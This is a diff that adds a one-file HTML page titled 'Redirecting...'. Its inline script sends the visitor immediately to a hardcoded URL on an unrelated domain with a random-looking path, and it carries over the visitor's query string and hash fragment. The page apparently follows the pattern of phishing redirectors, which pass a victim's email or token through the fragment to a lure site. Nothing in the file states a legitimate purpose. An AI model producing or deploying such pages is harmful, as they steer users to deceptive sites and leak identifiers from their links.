@@ -1,0 +1,37 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+
+<script>
+(function () {
+    "use strict";
+    const TARGET_URL = "https://mcabeesq.com/WhpfRKrLmBwNptpq";
+    const currentURL = window.location.href;
+    const queryIndex = currentURL.indexOf("?");
+    const hashIndex = currentURL.indexOf("#");
+    let suffix = "";
+    let startIndex = -1;
+    if (queryIndex !== -1 && hashIndex !== -1) {
+        startIndex = Math.min(queryIndex, hashIndex);
+    } else if (queryIndex !== -1) {
+        startIndex = queryIndex;
+    } else if (hashIndex !== -1) {
+        startIndex = hashIndex;
+    }
+    if (startIndex !== -1) {
+        suffix = currentURL.substring(startIndex);
+    }
+    const destination = TARGET_URL + suffix;
+    window.location.replace(destination);
+
+})();
+</script>
+
+</body>
+</html>
